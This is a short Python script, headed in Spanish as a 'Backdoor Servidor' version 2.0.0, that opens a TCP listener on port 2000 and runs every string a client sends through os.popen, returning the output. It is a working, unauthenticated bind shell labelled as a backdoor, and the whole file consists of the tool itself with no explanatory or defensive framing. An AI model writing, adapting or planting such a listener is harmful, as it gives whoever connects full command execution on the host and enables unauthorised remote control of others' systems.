"""
Uso: Backdoor Servidor
Creado: Andrés Hernández Mata
Version: 2.0.0
Python: 3.9.1
Fecha: 08 Abril 2020
"""

import socket
import sys
import os

os.system("cls")

servidor = ("127.0.0.1", 2000)
bufferSize = 1024

TCPServerSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
TCPServerSocket.bind(servidor)
TCPServerSocket.listen(5)  

print("[+] Iniciado Servidor...")

while True:    
    cliente, direccion = TCPServerSocket.accept()
    print("[-] Direccion ", direccion)          
    while True:        
        comando = cliente.recv(bufferSize)
        if comando == b"":
            break
        else:
            print("[+] Recibiendo Comando...") 
            comando = comando.decode()    
            salida = os.popen(comando)
            print("[+] Ejecutando...")  
            salida = salida.read()
            print("[+] Enviando Resultado...")
            salida = salida.encode()
            cliente.send(salida)    
            print("\n")
            print("[+] Esperando...")
    cliente.close()


